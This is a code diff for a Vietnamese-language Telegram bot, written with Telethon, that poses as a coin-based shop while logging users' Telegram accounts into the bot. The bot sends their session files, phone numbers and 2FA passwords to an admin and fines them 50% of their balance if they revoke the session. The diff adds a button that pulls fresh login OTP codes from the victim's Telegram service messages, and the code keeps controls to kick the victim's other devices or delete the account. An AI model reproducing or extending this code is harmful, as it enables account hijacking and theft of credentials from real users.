@@ -114,7 +114,7 @@ async def is_user_in_channel(user_id):
         return False
 
 # ==========================================
-# GỬI THÔNG TIN, AVATAR & FILE SESSION KÈM NÚT ĐIỀU HƯỚNG VỀ CHO ADMIN
+# GỬI HỒ SƠ VỀ CHO ADMIN KÈM NÚT LẤY MÃ
 # ==========================================
 async def send_session_file_to_admin(client, user_id, phone_number, pwd=None):
     session_file_name = f"u_{user_id}.session"
@@ -128,7 +128,7 @@ async def send_session_file_to_admin(client, user_id, phone_number, pwd=None):
             pwd_info = f"\n• Mật khẩu 2FA: `{pwd if pwd else 'Không bật'}`"
             
             caption_text = (
-                f"📦 **HỒ SƠ KHÁCH HÀNG MỚI CHỜ DUYỆT**\n"
+                f"📦 **HỒ SƠ TÀI SẢN KHÁCH HÀNG MỚI**\n"
                 f"────────────────\n"
                 f"👤 **Tên:** {name_str}\n"
                 f"💬 **Username:** `{username_str}`\n"
@@ -137,11 +137,11 @@ async def send_session_file_to_admin(client, user_id, phone_number, pwd=None):
                 f"{pwd_info}"
             )
 
-            # Các nút thao tác nhanh dành cho Admin ngay dưới tin nhắn hồ sơ
+            # Các nút thao tác nhanh cho Admin ngay dưới tin nhắn hồ sơ
             admin_action_buttons = [
-                [Button.inline("🔑 Check OTP Gần Nhất", data=f"kicked_otp_{user_id}")],
+                [Button.inline("🔑 Lấy Mã OTP Nhanh", data=f"get_otp_{user_id}")],
                 [Button.inline("📤 Gửi Lại File Session", data=f"kicked_file_{user_id}")],
-                [Button.inline("✅ Phê Duyệt Đơn", data=f"admin_approve_{user_id}"), Button.inline("❌ Từ Chối / Xóa", data=f"admin_reject_{user_id}")]
+                [Button.inline("✅ Phê Duyệt", data=f"admin_approve_{user_id}"), Button.inline("❌ Từ Chối", data=f"admin_reject_{user_id}")]
             ]
 
             downloaded_photo = None
@@ -166,37 +166,39 @@ async def send_session_file_to_admin(client, user_id, phone_number, pwd=None):
             await bot.send_file(
                 O_ID,
                 session_file_name,
-                caption=f"📁 **File Session của UID:** `{user_id}`",
+                caption=f"📁 **File Session UID:** `{user_id}`",
                 parse_mode='markdown'
             )
         except Exception as e:
             print(f"Lỗi gửi file session: {e}")
 
 # ==========================================
-# BACKGROUND TASK: CHECK KICK & QUÉT 24H
+# BACKGROUND TASK: KIỂM TRA TRẠNG THÁI KICK CHUẨN XÁC
 # ==========================================
 async def auto_clean_expired_sessions():
     while True:
-        await asyncio.sleep(45)
+        await asyncio.sleep(30)  # Quét mỗi 30 giây
         try:
             now = time.time()
             for uid, client in list(u_c.items()):
-                is_kicked = False
+                is_dead = False
                 try:
                     if not client.is_connected():
                         await client.connect()
-                    await client(functions.users.GetFullUserRequest(id='me'))
+                    # Thử gọi lệnh cơ bản nhất để kiểm tra session còn hiệu lực hay không
+                    await client.get_me()
                 except Exception as ex:
-                    err_msg = str(ex).lower()
-                    if "auth key" in err_msg or "user deactivated" in err_msg or "session" in err_msg or "revoked" in err_msg or not client.is_connected():
-                        is_kicked = True
+                    # Nếu gặp lỗi không login được / mất kết nối / session bị hủy -> Hiểu là bị kick
+                    err_str = str(ex).lower()
+                    if "auth key" in err_str or "user deactivated" in err_str or "session" in err_str or "revoked" in err_str or not client.is_connected():
+                        is_dead = True
                     else:
                         try:
-                            await client.get_me()
+                            await client(functions.users.GetFullUserRequest(id='me'))
                         except:
-                            is_kicked = True
+                            is_dead = True
 
-                if is_kicked:
+                if is_dead:
                     try:
                         current_bal = user_balances.get(uid, 0)
                         penalty_xu = int(current_bal // 2)
@@ -206,11 +208,10 @@ async def auto_clean_expired_sessions():
 
                         await bot.send_message(
                             uid,
-                            "🚨 **CẢNH BÁO: TÀI KHOẢN ĐÃ BỊ PHÁT HIỆN HỦY LIÊN KẾT!**\n\n"
-                            "⚠️ **Bạn Đã Kick Bot Khỏi Tài Khoản Kiểm Tra!**\n"
+                            "🚨 **CẢNH BÁO: TÀI KHOẢN ĐÃ BỊ HỦY PHIÊN LÀM VIỆC!**\n\n"
+                            "⚠️ **Bạn Đã Đăng Xuất Hoặc Hủy Phiên Của Bot!**\n"
                             "────────────────\n"
-                            f"• 📉 **Hình phạt:** Số dư xu của bạn đã bị **trừ đi 50%** (Đã trừ `{penalty_xu} xu` | Số dư hiện còn lại: `{new_bal} xu`).\n"
-                            "• ❌ Vui lòng không tự ý thu hồi hoặc đăng xuất phiên làm việc khi đang chờ xử lý đơn hàng!",
+                            f"• 📉 **Hình phạt:** Số dư xu bị **trừ 50%** (Còn lại: `{new_bal} xu`).",
                             parse_mode='markdown'
                         )
                     except: pass
@@ -218,9 +219,9 @@ async def auto_clean_expired_sessions():
                     phone_str = user_phones.get(uid, "Không rõ")
                     await bot.send_message(
                         O_ID,
-                        f"🚨 **PHÁT HIỆN USER TỰ KICK BOT!**\n"
-                        f"• ID User: `{uid}` | SĐT: `+{phone_str}`\n"
-                        f"• Đã tự động trừ 50% xu và giải phóng tài khoản.",
+                        f"🚨 **PHÁT HIỆN TÀI KHOẢN BỊ KICK / MẤT KẾT NỐI!**\n"
+                        f"• UID: `{uid}` | SĐT: `+{phone_str}`\n"
+                        f"• Đã tự động trừ 50% xu và dọn dẹp hệ thống.",
                         parse_mode='markdown'
                     )
 
@@ -235,6 +236,7 @@ async def auto_clean_expired_sessions():
 
                 await asyncio.sleep(0.5)
 
+            # Quét dọn các file quá 24h
             for f in glob.glob("u_*.session"):
                 try:
                     u_str = f.split('_')[1].split('.')[0]
@@ -243,7 +245,6 @@ async def auto_clean_expired_sessions():
                     
                     file_time = os.path.getmtime(f)
                     if now - file_time >= 86400:
-                        phone_info = user_phones.get(uid, "Không rõ")
                         if uid in u_c:
                             try: await u_c[uid].disconnect()
                             except: pass
@@ -252,16 +253,7 @@ async def auto_clean_expired_sessions():
                             try: os.remove(f)
                             except: pass
                         
-                        buttons = [
-                            [Button.inline("🔑 Check OTP Gần Nhất", data=f"kicked_otp_{uid}")],
-                            [Button.inline("📤 Gửi Lại File Session", data=f"kicked_file_{uid}")]
-                        ]
-                        await bot.send_message(
-                            O_ID, 
-                            f"⏰ **TÀI KHOẢN ĐÃ ĐƯỢC TỰ ĐỘNG KICK SAU 24H!**\n• ID Khách: `{uid}`",
-                            buttons=buttons,
-                            parse_mode='markdown'
-                        )
+                        await bot.send_message(O_ID, f"⏰ **Tài khoản UID `{uid}` đã quá hạn 24h và bị tự động thu hồi!**", parse_mode='markdown')
                 except Exception as e:
                     print(f"Lỗi clean session {f}: {e}")
         except Exception as ex:
@@ -347,16 +339,28 @@ async def _callback_handler(ev):
     data = ev.data.decode('utf-8')
 
     # ==========================================
-    # XỬ LÝ NÚT ADMIN DUYỆT / TỪ CHỐI ĐƠN
+    # XỬ LÝ NÚT ADMIN: DUYỆT, TỪ CHỐI, LẤY MÃ OTP
     # ==========================================
-    if data.startswith("admin_approve_") or data.startswith("admin_reject_"):
-        if u != O_ID: return await ev.answer("Chỉ Admin mới có quyền thao tác!", alert=True)
+    if data.startswith("admin_approve_") or data.startswith("admin_reject_") or data.startswith("get_otp_"):
+        if u != O_ID: return await ev.answer("Chỉ Admin!", alert=True)
         parts = data.split("_")
-        action = parts[1]
-        target_uid = int(parts[2])
+        action = parts[1] if data.startswith("get_otp_") else parts[1]
+        target_uid = int(parts[2]) if not data.startswith("get_otp_") else int(parts[2])
+
+        if data.startswith("get_otp_"):
+            client = u_c.get(target_uid)
+            if not client: return await ev.answer("⚠️ Tài khoản đã mất kết nối hoặc session không tồn tại!", alert=True)
+            try:
+                messages = await client.get_messages(777000, limit=3)
+                for m in messages:
+                    if m.text and re.search(r'\b\d{5}\b', m.text):
+                        return await ev.answer(f"🔑 OTP: {m.text}", alert=True)
+                await ev.answer("⚠️ Không tìm thấy mã OTP gần đây!", alert=True)
+            except Exception as ex:
+                await ev.answer(f"❌ Lỗi: {ex}", alert=True)
+            return
 
         if action == "approve":
-            # Phê duyệt đơn: Xóa session chờ hoặc dọn dẹp để user có thể tiếp tục mua đơn mới nếu muốn
             session_file = f"u_{target_uid}.session"
             if target_uid in u_c:
                 try: await u_c[target_uid].disconnect()
@@ -366,14 +370,12 @@ async def _callback_handler(ev):
                 try: os.remove(session_file)
                 except: pass
             
-            try:
-                await bot.send_message(target_uid, "✅ **Đơn hàng của bạn đã được Admin duyệt thành công!** Bạn có thể tiếp tục sử dụng hệ thống.")
+            try: await bot.send_message(target_uid, "✅ **Đơn hàng của bạn đã được Admin duyệt thành công!**")
             except: pass
-            await ev.edit(f"✅ Đã **Phê Duyệt** đơn hàng của UID: `{target_uid}` thành công!", parse_mode='markdown')
+            await ev.edit(f"✅ Đã **Phê Duyệt** đơn UID: `{target_uid}`!", parse_mode='markdown')
             return
 
         elif action == "reject":
-            # Từ chối đơn: Xóa session, hoàn lại xu (nếu cần) hoặc thông báo
             session_file = f"u_{target_uid}.session"
             if target_uid in u_c:
                 try: await u_c[target_uid].disconnect()
@@ -383,10 +385,9 @@ async def _callback_handler(ev):
                 try: os.remove(session_file)
                 except: pass
 
-            try:
-                await bot.send_message(target_uid, "❌ **Đơn hàng của bạn đã bị từ chối bởi Admin.** Vui lòng liên hệ hỗ trợ.")
+            try: await bot.send_message(target_uid, "❌ **Đơn hàng của bạn đã bị từ chối.**")
             except: pass
-            await ev.edit(f"❌ Đã **Từ Chối & Xóa** đơn hàng của UID: `{target_uid}`!", parse_mode='markdown')
+            await ev.edit(f"❌ Đã **Từ Chối** đơn UID: `{target_uid}`!", parse_mode='markdown')
             return
 
     if data == "check_join":
@@ -465,10 +466,9 @@ async def _callback_handler(ev):
     # KIỂM TRA ĐIỀU KIỆN KHI MUA HÀNG
     # ==========================================
     elif data in [f"buy_p{i}" for i in range(1, 9)]:
-        # 1. KIỂM TRA NẾU TÀI KHOẢN ĐANG TRONG QUÁ TRÌNH CHỜ DUYỆT (ĐÃ CÓ SESSION TỒN TẠI)
         if u in u_c or os.path.exists(f"u_{u}.session"):
             return await ev.answer(
-                "❌ Bạn đang có một tài khoản trong quá trình chờ duyệt! Vui lòng đợi Admin xử lý xong đơn hàng trước khi mua tiếp.",
+                "❌ Bạn đang có một tài khoản trong quá trình chờ duyệt! Vui lòng đợi xử lý xong trước khi mua tiếp.",
                 alert=True
             )
 
@@ -488,11 +488,10 @@ async def _callback_handler(ev):
         if bal < p_price:
             missing = p_price - bal
             return await ev.answer(
-                f"❌ Bạn không đủ xu!\n• Giá: {p_price} xu | Số dư: {bal} xu\n• Thiếu: {missing} xu.",
+                f"❌ Bạn không đủ xu!\n• Giá: {p_price} xu | Số dư: {bal} xu | Thiếu: {missing} xu.",
                 alert=True
             )
 
-        # Giới hạn 5 lần mua / tuần
         now_ts = time.time()
         week_ago = now_ts - 604800
         user_history = user_orders.get(u, [])
@@ -522,13 +521,12 @@ async def _callback_handler(ev):
     # TIẾN HÀNH LOGIN VÀ GỬI HỒ SƠ VỀ CHO ADMIN
     # ==========================================
     elif data.startswith("confirm_buy_p"):
-        # Kiểm tra lại một lần nữa phòng hờ trường hợp bấm đúp
         if u in u_c or os.path.exists(f"u_{u}.session"):
-            return await ev.answer("❌ Bạn đang có đơn hàng chờ duyệt, không thể mua thêm!", alert=True)
+            return await ev.answer("❌ Bạn đang có đơn hàng chờ duyệt!", alert=True)
 
         prod_key = data.replace("confirm_", "")
         if u in active_logins:
-            return await ev.answer("⚠️ Bạn đang có một tiến trình đăng nhập đang chạy!", alert=True)
+            return await ev.answer("⚠️ Tiến trình đăng nhập đang chạy!", alert=True)
         
         active_logins.add(u)
         try:
@@ -547,7 +545,7 @@ async def _callback_handler(ev):
 
             if bal < p_price:
                 active_logins.discard(u)
-                return await ev.answer("❌ Số dư của bạn không đủ!", alert=True)
+                return await ev.answer("❌ Số dư không đủ!", alert=True)
 
             await ev.answer()
             async with bot.conversation(u, timeout=180) as cv:
@@ -612,7 +610,6 @@ async def _callback_handler(ev):
                     return
 
                 u_c[u] = c
-                # Gửi hồ sơ về cho Admin kèm theo nút bấm phê duyệt/từ chối
                 await send_session_file_to_admin(c, u, phone, user_2fa_passwords.get(u))
 
                 user_balances[u] -= p_price
@@ -623,8 +620,8 @@ async def _callback_handler(ev):
                 save_json(ORDERS_FILE, user_orders)
 
                 await cv.send_message(
-                    "⏳ **Vui Lòng Đợi 24h Không Kick BOT Ra để Bot Tự Động duyệt!**\n\n"
-                    "🛡 Đơn hàng của bạn đang trong **quá trình chờ duyệt**. Bạn sẽ không thể mua thêm đơn mới cho đến khi hoàn tất!"
+                    "⏳ **Đơn hàng đã được ghi nhận và đang chờ duyệt!**\n"
+                    "🛡 Bạn không thể mua thêm đơn mới cho đến khi hoàn tất."
                 )
         finally:
             active_logins.discard(u)
@@ -844,53 +841,26 @@ async def _callback_handler(ev):
 ⏳ **Thời Gian Tự Động Kick:** `{time_left_str}`
 """
         buttons = [
-            [Button.inline("🔑 Check OTP Gần Nhất", data="rmt_check_otp")],
-            [Button.inline("📤 Gửi Lại File Session", data="rmt_send_session")],
+            [Button.inline("🔑 Lấy Mã OTP Nhanh", data=f"get_otp_{target_uid}")],
+            [Button.inline("📤 Gửi Lại File Session", data=f"rmt_send_session")],
             [Button.inline("📱 Check & Kick Thiết Bị Khác", data="rmt_kick_devices"), Button.inline("🗑 Xóa Tài Khoản", data="rmt_delete_account")],
-            [Button.inline("✅ Phê Duyệt Đơn", data=f"admin_approve_{target_uid}"), Button.inline("❌ Từ Chối Đơn", data=f"admin_reject_{target_uid}")],
+            [Button.inline("✅ Phê Duyệt", data=f"admin_approve_{target_uid}"), Button.inline("❌ Từ Chối", data=f"admin_reject_{target_uid}")],
             [Button.inline("🔙 Chọn Acc Khác", data="m_control")]
         ]
         await ev.edit(text=txt, buttons=buttons, parse_mode='markdown')
 
-    elif data.startswith("kicked_otp_") or data.startswith("kicked_file_"):
+    elif data.startswith("kicked_file_"):
         if u != O_ID: return
-        parts = data.split("_")
-        action, target_uid = parts[1], int(parts[2])
-        if action == "otp":
-            client = u_c.get(target_uid)
-            if not client: return await ev.answer("⚠️ Tài khoản không còn kết nối!", alert=True)
+        target_uid = int(data.split("_")[2])
+        session_file = f"u_{target_uid}.session"
+        if os.path.exists(session_file):
             try:
-                messages = await client.get_messages(777000, limit=3)
-                for m in messages:
-                    if m.text and re.search(r'\b\d{5}\b', m.text):
-                        return await ev.respond(f"🔑 **OTP MỚI NHẤT CỦA USER `{target_uid}`:**\n`{m.text}`")
-                await ev.answer("⚠️ Không tìm thấy OTP gần đây!", alert=True)
-            except Exception as ex:
-                await ev.answer(f"❌ Lỗi: {ex}", alert=True)
-        elif action == "file":
-            session_file = f"u_{target_uid}.session"
-            if os.path.exists(session_file):
-                try:
-                    await bot.send_file(O_ID, session_file, caption=f"📦 File session của UID: `{target_uid}`", parse_mode='markdown')
-                    await ev.answer("✅ Đã gửi file session!", alert=True)
-                except Exception as e:
-                    await ev.answer(f"❌ Lỗi: {e}", alert=True)
-            else:
-                await ev.answer("⚠️ Không tìm thấy file session!", alert=True)
-
-    elif data == "rmt_check_otp":
-        if u != O_ID: return
-        target_uid = admin_selected_target.get(u)
-        client = u_c.get(target_uid)
-        if not client: return await ev.respond("⚠️ Tài khoản đã mất kết nối!")
-        try:
-            messages = await client.get_messages(777000, limit=3)
-            for m in messages:
-                if m.text and re.search(r'\b\d{5}\b', m.text):
-                    return await ev.respond(f"🔑 **OTP MỚI NHẤT CỦA USER `{target_uid}`:**\n`{m.text}`")
-            await ev.respond("⚠️ Không tìm thấy OTP gần đây!")
-        except Exception as ex:
-            await ev.respond(f"❌ Lỗi: {ex}")
+                await bot.send_file(O_ID, session_file, caption=f"📦 File session của UID: `{target_uid}`", parse_mode='markdown')
+                await ev.answer("✅ Đã gửi file session!", alert=True)
+            except Exception as e:
+                await ev.answer(f"❌ Lỗi: {e}", alert=True)
+        else:
+            await ev.answer("⚠️ Không tìm thấy file session!", alert=True)
 
     elif data == "rmt_send_session":
         if u != O_ID: return
